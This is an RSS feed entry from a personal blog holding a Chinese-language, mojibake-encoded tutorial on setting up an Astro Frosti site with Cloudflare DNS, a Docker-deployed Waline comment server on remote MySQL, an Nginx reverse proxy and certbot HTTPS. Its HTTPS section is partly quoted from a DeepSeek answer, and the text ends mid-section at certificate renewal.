<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:version="2.0"><channel><title>Dalekov&apos;s Blog</title><description>Dalekov&apos;s blog</description><link>https://www.tankimzeg.top/</link><language>en</language><item><title>Frosti+Nginx+Walineå»ºç«™å…¨è¿‡ç¨‹</title><link>https://www.tankimzeg.top/blog/frostinginxwaline%E5%BB%BA%E7%AB%99%E5%85%A8%E8%BF%87%E7%A8%8B/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/frostinginxwaline%E5%BB%BA%E7%AB%99%E5%85%A8%E8%BF%87%E7%A8%8B/</guid><description>æœ¬åšå®¢ç½‘ç«™çš„å»ºç«‹è¿‡ç¨‹</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/frostinginxwaline%E5%BB%BA%E7%AB%99%E5%85%A8%E8%BF%87%E7%A8%8B/&quot;&gt;https://www.tankimzeg.top/blog/frostinginxwaline%E5%BB%BA%E7%AB%99%E5%85%A8%E8%BF%87%E7%A8%8B/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;ç”¨äº†å‡ å¤©æ—¶é—´,æˆ‘çš„ç½‘ç«™ç»ˆäºå»ºè®¾å¥½äº†!&lt;/p&gt;
&lt;p&gt;æˆ‘ä½¿ç”¨Astroçš„Frostiæ¨¡æ¿,Nginxåä»£å®ç°dockerç‹¬ç«‹éƒ¨ç½²Waline.ä¸ºäº†å®ç°åä»£è´­ä¹°äº†ä¸€ä¸ªåŸŸå,å°†åŸæ¥ç”¨IPåœ°å€è®¿é—®ç»‘å®šåˆ°åŸŸå,å¹¶ä½¿ç”¨HTTPSåè®®æå‡å®‰å…¨æ€§.&lt;/p&gt;
&lt;p&gt;æ•°æ®åº“ä½¿ç”¨è¿œç¨‹Azure flexible MySQL.&lt;/p&gt;
&lt;h1&gt;è´­ä¹°åŸŸåå¹¶æ‰˜ç®¡åˆ°Cloudflare&lt;/h1&gt;
&lt;p&gt;åœ¨&lt;a href=&quot;https://www.spaceship.com&quot;&gt;Spaceship&lt;/a&gt;ä¸Šè´­ä¹°ä¸€ä¸ªåŸŸå,æ”¯æŒæ”¯ä»˜å®ä»˜æ¬¾,å…·ä½“bilibiliä¸Šæœ‰è§†é¢‘å±•ç¤ºè¿‡ç¨‹.&lt;/p&gt;
&lt;p&gt;å°†åŸŸåæ‰˜ç®¡åˆ°&lt;a href=&quot;https://dash.cloudflare.com&quot;&gt;Cloudflare&lt;/a&gt;ä¸Š:
(å…·ä½“çœ‹åˆ«çš„æ•™ç¨‹å§,è¿™é‡Œæˆ‘å‡­å°è±¡è¯´ä¸€ä¸‹)
å…ˆç™»å½•è‡ªå·±çš„é‚®ç®±è´¦å·,ç„¶åç‚¹Overview,è¾“å…¥è‡ªå·±çš„åŸŸå(æ³¨æ„è¿™æ—¶å€™æ˜¯ä¸å«wwwè¿™ç±»äºŒçº§åŸŸåçš„)ç„¶å(æˆ‘è®°å¾—æœ‰ä¸€æ­¥é€‰æ‹©å¥—é¤,ä¸è®°å¾—å…ˆåé¡ºåºäº†,é‚£é‡Œé€‰æ‹©$0å…è´¹çš„.)Cloudflareä¼šå¯¹åŸŸåè¿›è¡ŒDNSè§£æ,è¿™æ—¶å€™,ç”±äºåŸŸåä¹‹å‰ç”±SpaceshipæŒæœ‰,æ‰€ä»¥è¿™é‡Œä¼šå‡ºç°å‡ æ¡è®°å½•,IPv4å’ŒIPv6å¯èƒ½éƒ½æœ‰,å…ˆåˆ æ‰,ä¹‹åè¦è§£ææˆè‡ªå·±çš„IPåœ°å€å˜›.æœ€åå‡ºç°ä¸¤ä¸ªCFçš„DNSæœåŠ¡å™¨,å¤åˆ¶å,åœ¨Spaceshipä¸­æ‰¾åˆ°è‡ªå·±çš„è´­ä¹°çš„åŸŸå&lt;a href=&quot;https://www.spaceship.com/application/domain-list-application/&quot;&gt;Domain Manager App - Spaceship&lt;/a&gt;,
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250323105409.png&quot; alt=&quot;&quot;&gt;
å¡«å†™åˆ°Nameserversé‡Œé¢å»,è®¾ç½®ä¸ºCustom nameservers
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250323105524.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;å›åˆ°Cloudflare,åœ¨å·¦ä¾§å¯¼èˆªæ ä¸­ç‚¹å‡»DNS -&amp;gt; Records,å½“ä½ çš„åŸŸåæ˜¾ç¤ºç»¿è‰²çš„Activateä¹‹å,å¯ä»¥ç®¡ç†DNS Records.æŠŠæ— å…³çš„DNSè®°å½•åˆ æ‰,ç„¶åæ·»åŠ Aè®°å½•.&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;A è®°å½•ï¼ˆå°†åŸŸåæŒ‡å‘æœåŠ¡å™¨ IPï¼‰&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;åç§°&lt;/strong&gt;ï¼š&lt;code&gt;@&lt;/code&gt;ï¼ˆè¡¨ç¤ºä¸»åŸŸåï¼Œå¦‚Â &lt;code&gt;example.com&lt;/code&gt;ï¼‰æˆ–Â &lt;code&gt;www&lt;/code&gt;ï¼ˆè¡¨ç¤ºÂ &lt;code&gt;www.example.com&lt;/code&gt;ï¼‰ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;IPv4 åœ°å€&lt;/strong&gt;ï¼šæ‚¨çš„æœåŠ¡å™¨ IP åœ°å€ï¼ˆå¦‚Â &lt;code&gt;123.45.67.89&lt;/code&gt;ï¼‰ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Proxy status&lt;/strong&gt;ï¼šé€‰æ‹©Â &lt;strong&gt;Proxied&lt;/strong&gt;ï¼ˆæ©™è‰²äº‘å›¾æ ‡ï¼‰ï¼Œä»¥é€šè¿‡ Cloudflare çš„ CDN å’Œå®‰å…¨æœåŠ¡ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;æˆ‘æ³¨æ„åˆ°è¿˜æœ‰å…¶ä»–ç±»å‹çš„è®°å½•,å¦‚AAAAå¯¹åº”çš„æ˜¯IPv6åœ°å€,NSæ˜¯è‡ªå·±æœåŠ¡å™¨ä¸Šçš„DNSæœåŠ¡,è¿™äº›æˆ‘æš‚æ—¶éƒ½ç”¨ä¸ä¸Š.å…¶å®å­åŸŸåå¦‚blog.example.comåº”è¯¥æ˜¯å¯ä»¥ç”¨CNAMEçš„,ä¸è¿‡æˆ‘æ²¡ç”¨.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä¿å­˜å,è¿‡å‡ åˆ†é’Ÿ,åœ¨ä»¥ä¸‹ç½‘ç«™æœç´¢è‡ªå·±çš„åŸŸåå°±èƒ½çœ‹åˆ°Aè®°å½•çš„å˜åŒ–.ç”±äºä¸–ç•Œå„åœ°çš„DNSæœåŠ¡å™¨éƒ½æœ‰å„è‡ªçš„ç¼“å­˜,å¯èƒ½è¿˜ç•™æœ‰æ—§çºªå½•.ç”±äºæˆ‘ä»¬é€‰æ‹©äº†CFçš„ProxyæœåŠ¡,æ‰€ä»¥çœ‹ä¸åˆ°è‡ªå·±æœåŠ¡å™¨çš„çœŸå®IP,ä¸ç”¨æ‹…å¿ƒæ˜¯è‡ªå·±è®¾ç½®é”™äº†.
&lt;a href=&quot;https://www.itdog.cn/dns/&quot;&gt;æŸ¥çœ‹å›½å†…DNSè§£ææƒ…å†µ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://dnschecker.org/&quot;&gt;æŸ¥çœ‹å…¨çƒDNSè§£ææƒ…å†µ&lt;/a&gt;
å¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥nslookup(for Windows)æˆ–nslookup/dig(for Linux)æŸ¥çœ‹è‡ªå·±æ‰€åœ¨ç½‘ç»œçš„åŸŸåè§£æç»“æœ:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nslookup example.com
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;dig example.com
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;åœ¨Frostiä¸­å¯ç”¨Waline&lt;/h1&gt;
&lt;p&gt;åŸä½œè€…é»˜è®¤å…³é—­äº†è¿™ä¸ªåŠŸèƒ½,æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨å¯ç”¨.
æµè§ˆé¡¹ç›®ç»“æ„,æ‰“å¼€src/pages/blog/[...slug].astroæ–‡ä»¶,æ‰¾åˆ°å¦‚ä¸‹ä»£ç :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;  &amp;lt;BaseCard
    title={post.data.title}
    image={post.data.image}
    pubDate={post.data.pubDate}
    badge={post.data.badge}
    categories={post.data.categories}
    tags={post.data.tags}
    word={remarkPluginFrontmatter.totalCharCount}
    time={remarkPluginFrontmatter.readingTime}
    isBlog=&amp;quot;true&amp;quot;
  &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ·»åŠ ä¸€è¡Œ&lt;code&gt;comment=&amp;quot;true&amp;quot;&lt;/code&gt; :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;  &amp;lt;BaseCard
    title={post.data.title}
    image={post.data.image}
    pubDate={post.data.pubDate}
    badge={post.data.badge}
    categories={post.data.categories}
    tags={post.data.tags}
    word={remarkPluginFrontmatter.totalCharCount}
    time={remarkPluginFrontmatter.readingTime}
    isBlog=&amp;quot;true&amp;quot;
    comment=&amp;quot;true&amp;quot;
  &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶ååœ¨ src/consts.tsæ–‡ä»¶ä¿®æ”¹SERVER_URL,ä¾‹å¦‚ &lt;a href=&quot;http://waline.example.com&quot;&gt;http://waline.example.com&lt;/a&gt;
,æˆ‘ä»¬æš‚æ—¶è¿˜æ²¡æœ‰è¿™ä¸ªç½‘ç«™,è¦å¾€CFé‡Œæ·»åŠ è¿™ä¸€æ¡è®°å½•.&lt;/p&gt;
&lt;h2&gt;éƒ¨ç½²Waline&lt;/h2&gt;
&lt;p&gt;æ¥åˆ°&lt;a href=&quot;https://waline.js.org/guide/&quot;&gt;waline&lt;/a&gt;æ–‡æ¡£,æˆ‘ä»¬å¯ä»¥é€‰æ‹©é€‚åˆè‡ªå·±çš„æ–¹å¼éƒ¨ç½².åˆ«çš„é‚£äº›çº¿ä¸Šéƒ¨ç½²æˆ‘ä¸ç†Ÿæ‚‰,çœ‹èµ·æ¥ä¹ŸæŒºéº»çƒ¦çš„,æˆ‘é€‰æ‹©çš„æ˜¯éå¸¸åŸå§‹ä½†æˆ‘ç†Ÿæ‚‰çš„Docker + MySQL&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæˆ‘å‚è€ƒäº†&lt;a href=&quot;https://bg3lnt.xyz/posts/dc23e930.html&quot;&gt;ä½¿ç”¨dockerç‹¬ç«‹éƒ¨ç½²MySQL&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä¸è¿‡æˆ‘æœ‰è¿œç¨‹çš„MySQLæœåŠ¡å™¨(å¾—æ„Ÿè°¢Githubå­¦ç”ŸåŒ…å•Š,ç¾ç¾äº«ç”¨å¾®è½¯çš„AzureæœåŠ¡å™¨)&lt;/p&gt;
&lt;p&gt;æˆ‘å…ˆè¿æ¥æˆ‘çš„æ•°æ®åº“(è¿™é‡Œç”¨çš„æ˜¯Navicat,æ²¡ç”¨çš„è¯ä¹Ÿå¯ä»¥ç”¨å‘½ä»¤è¡Œå»è¿æ¥),ç„¶åæ–°å»ºä¸€ä¸ªæ•°æ®åº“&lt;code&gt;waline&lt;/code&gt;,å³é”®&amp;quot;è¿è¡ŒSQLæ–‡ä»¶:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250323113458.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;walineæ–‡æ¡£æŒ‡å¼•æˆ‘ä»¬å¯¼å…¥&lt;a href=&quot;https://github.com/walinejs/waline/blob/main/assets/waline.sql&quot;&gt;waline.sql&lt;/a&gt;æ–‡ä»¶,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸€å¼€å§‹è¿™ä¸ªæ–‡ä»¶å¯¼å…¥ä¼šå‡ºé”™,å› ä¸ºå«æœ‰éæ³•çš„SQLè¯­å¥.æˆ‘å·²å‘æºé¡¹ç›®æäº¤PR.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¯¼å…¥å,ç¡®ä¿ä½ çš„æœåŠ¡å™¨ä¸Šå·²ç»ä¸‹è½½å¥½äº†walineçš„ä»“åº“:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;git clone https://github.com/walinejs/waline.git
cd waline/packages/server
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç¼–è¾‘docker-composeæ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo vim docker-compose.yml
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# docker-compose.yml
version: &amp;#39;3&amp;#39;

services:
  waline:
    container_name: waline
    image: lizheming/waline:latest
    restart: always
    ports:
      - 172.17.0.1:8360:8360
    volumes:
      - ${PWD}/data:/app/data
    environment:
      TZ: &amp;#39;Asia/Shanghai&amp;#39;
      MYSQL_HOST: &amp;quot;REMOTE DATABASE HOST&amp;quot;
      MYSSQL_PORT: 3306
      MYSQL_DB: &amp;quot;waline&amp;quot;
      MYSQL_USER: &amp;quot;USERXXX&amp;quot;
      MYSQL_PASSWORD: &amp;quot;PSWXXX&amp;quot;
      MYSQL_SSL: &amp;quot;true&amp;quot;
      SITE_NAME: &amp;quot;å¯ä¸å¡«&amp;quot;
      SITE_URL: &amp;#39;å¯ä¸å¡«&amp;#39;
      AUTHOR_EMAIL: &amp;#39;YOUR EMAIL&amp;#39;
      IPQPS: 30 # å‚è€ƒæœåŠ¡ç«¯é…ç½®
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; å‚è€ƒ&lt;a href=&quot;https://waline.js.org/reference/server/env.html&quot;&gt;æœåŠ¡ç«¯ç¯å¢ƒå˜é‡ | Waline&lt;/a&gt;å¯ä»¥è‡ªå·±æ·»åŠ 
ç¼–å†™å¥½é…ç½®æ–‡ä»¶å&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;æœ€å¥½æŒ‰æˆ‘çš„æ¥,ç”¨docker-compose,ä¸è¦ç”¨æ–‡æ¡£ä¸Šçš„docker build,ä¸å¾—ä¸è¯´,dockeréƒ¨ç½²è¿™éƒ¨åˆ†çš„æ–‡æ¡£å†™å¾—æ··ä¹±&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; æˆåŠŸå,dockerå®¹å™¨è¿è¡Œåœ¨8360ç«¯å£ä¸Š,ä¸”å¤–éƒ¨ä¸å¯é€šè¿‡IP:8360è®¿é—®åˆ°,æ¯”è¾ƒå®‰å…¨.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;netstat -tln
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;172.17.0.1:8360å¤„äºLISTENçŠ¶æ€.&lt;/p&gt;
&lt;h1&gt;é…ç½®Nginx&lt;/h1&gt;
&lt;p&gt;æˆ‘çš„ç½‘ç«™ä¸€å¼€å§‹æ˜¯ç›´æ¥IPè®¿é—®80ç«¯å£çš„,ç°åœ¨,æˆ‘ä»¬å¯ä»¥æ”¹ç”¨åŸŸåè®¿é—®,ç¨å,å†å‡çº§ä¸ºHTTPS.
é¦–å…ˆ,nginxçš„é…ç½®æ–‡ä»¶éƒ½åœ¨/etc/nginxé‡Œé¢&lt;/p&gt;
&lt;p&gt;conf.d,site-avalible,site-enableéƒ½å­˜æ”¾äº†serveré…ç½®æ–‡ä»¶.ç½‘é¡µå±•ç¤ºçš„site-enableé‡Œ.Nginxé»˜è®¤çš„é¡µé¢æ”¾åœ¨site-enable,å¹¶ä¸”site-avalibleé‡Œä¹Ÿæœ‰ä¸€ä»½.æˆ‘çš„å®è·µæ–¹å¼æ˜¯åœ¨site-avalibleä¸­ç¼–è¾‘é…ç½®æ–‡ä»¶,ç„¶ååœ¨site-enableä¸­åˆ›å»ºè½¯è¿æ¥æŒ‡ç€site-avalibleçš„æ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cd ./site-enable
ln -s ../site-avalible/astro astro
ln -s ../site-avalible/waline waline
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç¼–å†™ç±»ä¼¼å¦‚ä¸‹çš„å†…å®¹:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nginx&quot;&gt;server {
	listen 80;
    server_name www.example.com example.com;  # ä½ çš„åŸŸåæˆ–è€… IP åœ°å€

    root /path/to/astroProject/dist;  # æŒ‡å‘ Astro æ„å»ºçš„ dist ç›®å½•
    index index.html;

    # é…ç½®é™æ€èµ„æºç¼“å­˜ï¼ˆå¯é€‰ï¼‰
    location / {
        try_files $uri $uri/ =404;
    }

    # é…ç½® gzip å‹ç¼©ï¼ˆå¯é€‰ï¼Œæé«˜æ€§èƒ½ï¼‰
    gzip on;
    gzip_types text/plain application/xml text/css application/javascript;
    gzip_min_length 1000;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¿å­˜é€€å‡ºå,æµ‹è¯•å¹¶é‡å¯nginx&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo nginx -t
sudo systemctl restart nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Nginxåä»£Waline&lt;/h2&gt;
&lt;p&gt;è¿˜è®°å¾—æˆ‘ä»¬åœ¨Frostié‡Œé¢æŠŠSERVER_URLè®¾ç½®ä¸ºwaline.example.comå—?è®¿é—®è¿™ä¸ªURL,å®é™…ä¸Šæ˜¯è®¿é—®çš„80 æˆ–443ç«¯å£,è€Œä¸æ˜¯dockerè¿è¡Œçš„8360ç«¯å£,è€Œä¸”dockerå®¹å™¨åªå¯¹å†…ç½‘å¼€æ”¾.æ‰€ä»¥,åƒä¸Šé¢é‚£æ ·é…ç½®æ˜¯ä¸èƒ½ç›´æ¥æä¾›æœåŠ¡çš„.&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¦åšçš„æ˜¯åƒä¸€ä¸ªè·¯ç”±å™¨é‚£æ ·,æŠŠå¤–æ¥çš„è¯·æ±‚è½¬å‘åˆ°å†…ç½‘çš„å¦ä¸€ä¸ªåœ°æ–¹å»,è¿™å°±å«&lt;strong&gt;åå‘ä»£ç†&lt;/strong&gt;,æ˜¯Nginxä¸€ä¸ªå¾ˆå¼ºå¤§çš„åŠŸèƒ½.&lt;/p&gt;
&lt;p&gt;åœ¨ä¸Šé¢çš„docker-compose.ymlæ–‡ä»¶ä¸­,æˆ‘ä»¬æŠŠ172.17.0.1:8360æ˜ å°„åˆ°é•œåƒçš„8360ç«¯å£,netstatä¹Ÿæ˜¾ç¤ºå®¹å™¨ç›‘å¬172.17.0.1çš„8360ç«¯å£,æ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠæ¥è‡ªåŸŸåwaline.example.comçš„è¯·æ±‚å‘é€åˆ°172.17.0.1:8360å».&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nginx&quot;&gt;sever {
	listen 80;
	server_name waline.example.com;

	location / {
		proxy_pass http://172.17.0.1:8360;
		proxy_http_version 1.1;
		proxy_set_header Host $host;
		proxy_set_header X-Real-IP $remote_addr;
		proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
		proxy_set_header X-Forwarded-Proto $scheme;
		proxy_set_header REMOTE-HOST $remote_addr;
		add_header X-Cache $upstream_cache_status;
		add_header Cahce-Control no-cache;
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ ·éƒ¨ç½²å,ç™»å½•Walineç®¡ç†é¡µé¢å°±èƒ½åˆ›å»ºç®¡ç†è´¦å·(ç¬¬ä¸€ä¸ªç™»å½•çš„ç”¨æˆ·ä¼šè¢«è®¾ç½®ä¸ºç®¡ç†å‘˜).&lt;/p&gt;
&lt;h3&gt;ç¦æ­¢ç”¨æˆ·è®¿é—®Walineçš„demoé¡µé¢&lt;/h3&gt;
&lt;p&gt;ä¸Šè¿°é…ç½®å…¨éƒ¨æˆåŠŸå,è®¿é—®åå‘ä»£ç†çš„è‡ªå®šä¹‰åŸŸå&lt;code&gt;waline.example.com&lt;/code&gt;æ—¶,ä¼šæ˜¾ç¤º Waline çš„ demo é¡µé¢,è¿™ä¸ªé¡µé¢ä¸åº”å±•ç¤º.&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nginx&quot;&gt;location ~* ^/.+ {
	#   åŸé…ç½®
	...
}
location = / {
	return 403;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…,åªæœ‰åé¢è·Ÿæœ‰request urlçš„è¯·æ±‚æ‰è¢«è½¬å‘,å¦åˆ™è¿”å›403 ForbiddençŠ¶æ€ç .&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;é…ç½®å®Œæˆå,è®°å¾—é‡å¯nginxæœåŠ¡å“¦~&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;æ³¨å†ŒHTTPSè¯ä¹¦&lt;/h1&gt;
&lt;p&gt;ä»¥ä¸‹æ“ä½œéƒ½æ˜¯Deepseekå‘Šè¯‰æˆ‘çš„,åŸºäºæˆ‘å·²ç»é…ç½®å¥½HTTPæœåŠ¡,å®æµ‹å¯ç”¨.å¦‚æœä½ æ²¡æœ‰HTTPæœåŠ¡,ä¸çŸ¥é“è¿™åª &lt;code&gt;certbot&lt;/code&gt; ä¼šæ€ä¹ˆå¤„ç†.ğŸ¤–&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;em&gt;DeepSeek - æ¢ç´¢æœªè‡³ä¹‹å¢ƒ&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;ä»¥ä¸‹æ˜¯è¯¦ç»†çš„æ­¥éª¤ï¼ŒæŒ‡å¯¼æ‚¨å¦‚ä½•ä¸ºä½¿ç”¨ &lt;strong&gt;Nginx + Cloudflare&lt;/strong&gt; çš„ç½‘ç«™é…ç½® HTTPSï¼š&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;1. åœ¨ Cloudflare ä¸­å¯ç”¨ HTTPS&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;Cloudflare æä¾›å…è´¹çš„ SSL/TLS è¯ä¹¦ï¼Œå¹¶è‡ªåŠ¨ä¸ºæ‚¨çš„åŸŸåå¯ç”¨ HTTPSã€‚&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;æ­¥éª¤ 1ï¼šç™»å½• Cloudflare æ§åˆ¶é¢æ¿&lt;/strong&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;è®¿é—® &lt;a href=&quot;https://www.cloudflare.com/&quot;&gt;Cloudflare&lt;/a&gt; å¹¶ç™»å½•æ‚¨çš„è´¦æˆ·ã€‚&lt;/li&gt;
&lt;li&gt;é€‰æ‹©æ‚¨çš„åŸŸåã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h4&gt;&lt;strong&gt;æ­¥éª¤ 2ï¼šé…ç½® SSL/TLS æ¨¡å¼&lt;/strong&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;ç‚¹å‡» &lt;strong&gt;SSL/TLS&lt;/strong&gt; â†’ &lt;strong&gt;Overview&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;é€‰æ‹© SSL/TLS æ¨¡å¼ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Flexible&lt;/strong&gt;ï¼šä»…åŠ å¯†æµè§ˆå™¨åˆ° Cloudflare çš„æµé‡ï¼ˆä¸æ¨èï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Full&lt;/strong&gt;ï¼šåŠ å¯†æµè§ˆå™¨åˆ° Cloudflare å’Œ Cloudflare åˆ°æœåŠ¡å™¨çš„æµé‡ï¼ˆæœåŠ¡å™¨å¯ä½¿ç”¨è‡ªç­¾åè¯ä¹¦ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Full (Strict)&lt;/strong&gt;ï¼šåŠ å¯†å…¨é“¾è·¯æµé‡ï¼ˆæœåŠ¡å™¨éœ€å®‰è£…æœ‰æ•ˆè¯ä¹¦ï¼Œæ¨èé€‰æ‹©æ­¤é¡¹ï¼‰ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;é€‰æ‹© &lt;code&gt;Full&lt;/code&gt;&lt;a href=&quot;%E6%88%91%E9%80%89%E7%9A%84%E6%98%AFFull&quot;&gt;^1&lt;/a&gt; æˆ– &lt;code&gt;Full (Strict)&lt;/code&gt;&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å¯ç”¨ &lt;strong&gt;Always Use HTTPS&lt;/strong&gt;ï¼ˆå¼ºåˆ¶æ‰€æœ‰ HTTP è¯·æ±‚è·³è½¬åˆ° HTTPSï¼‰&lt;a href=&quot;Certbot%F0%9F%A4%96%E5%9C%A8Nginx%E4%B8%AD%E8%87%AA%E5%8A%A8%E5%A4%84%E7%90%86,%E6%89%80%E4%BB%A5%E6%88%91%E6%9C%AA%E8%AE%BE%E7%BD%AE&quot;&gt;^5&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;strong&gt;2. ä¸ºæœåŠ¡å™¨è·å– SSL è¯ä¹¦&lt;/strong&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;strong&gt;ä½¿ç”¨ Let&amp;#39;s Encrypt å…è´¹è¯ä¹¦ï¼ˆæ¨èï¼‰&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Let&amp;#39;s Encrypt æä¾›å…è´¹çš„ SSL è¯ä¹¦ï¼Œå¹¶é€šè¿‡ Certbot å·¥å…·è‡ªåŠ¨åŒ–ç®¡ç†ã€‚&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;æ­¥éª¤ 1ï¼šå®‰è£… Certbot&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ˆä»¥ Ubuntu/Debian ä¸ºä¾‹ï¼‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt update
sudo apt install certbot python3-certbot-nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;strong&gt;æ­¥éª¤ 2ï¼šè·å–è¯ä¹¦&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;è¿è¡Œ Certbot å¹¶è‡ªåŠ¨é…ç½® Nginxï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo certbot --nginx -d example.com -d www.example.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ï¼ˆå°† &lt;code&gt;example.com&lt;/code&gt; æ›¿æ¢ä¸ºæ‚¨çš„åŸŸåï¼‰&lt;/p&gt;
&lt;p&gt;Certbot ä¼šï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è‡ªåŠ¨éªŒè¯åŸŸåæ‰€æœ‰æƒã€‚&lt;/li&gt;
&lt;li&gt;ç”Ÿæˆ SSL è¯ä¹¦ï¼ˆä¿å­˜åœ¨ &lt;code&gt;/etc/letsencrypt/live/example.com/&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;è‡ªåŠ¨ä¿®æ”¹ Nginx é…ç½®æ–‡ä»¶ä»¥å¯ç”¨ HTTPSã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h4&gt;&lt;strong&gt;æ­¥éª¤ 3ï¼šéªŒè¯è¯ä¹¦è‡ªåŠ¨ç»­æœŸ&lt;/strong&gt;&lt;/h4&gt;
